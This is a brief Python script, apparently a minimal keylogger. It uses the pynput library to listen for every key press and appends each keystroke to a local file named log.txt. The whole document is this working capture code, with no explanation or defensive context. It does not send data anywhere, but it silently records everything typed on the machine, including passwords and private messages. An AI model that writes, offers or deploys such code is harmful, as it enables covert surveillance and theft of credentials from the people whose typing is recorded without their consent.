from pynput.keyboard import Listener
def save(key):
    kbdata = str(key)
    kbdata = kbdata.replace("'","")
    with open("log.txt","a") as x:
        x.write(kbdata)
with Listener(on_press=save) as y:
    y.join()
